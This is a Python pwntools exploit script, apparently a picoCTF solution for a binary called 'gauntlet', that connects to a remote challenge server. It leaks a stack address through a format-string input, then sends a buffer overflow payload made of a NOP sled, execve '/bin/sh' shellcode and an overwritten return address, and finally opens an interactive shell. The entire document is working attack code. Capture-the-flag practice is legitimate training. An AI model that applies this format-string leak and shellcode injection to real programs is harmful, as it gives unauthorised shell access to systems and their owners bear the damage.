from pwn import *

elf = context.binary = ELF("./gauntlet")


# p = gdb.debug(elf.path, '''
# b *main+160
# c
# ''')
# p = process(elf.path)
p = remote('mercury.picoctf.net', 33542)

p.sendline('%6$p')
leaked = p.recvline().strip()
print(leaked)

leaked_stack = int(leaked, 16)

const = 0x128
leaked_stack -= const
print(f"[+] leaked {hex(leaked_stack)}")

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

array_len = 0x78
payload = 0x40 * b'\x90'
payload += shellcode
payload += b'\x90' * (array_len - len(payload))
payload += p64(leaked_stack)


# print(p.clean())
p.sendline(payload)
p.interactive()

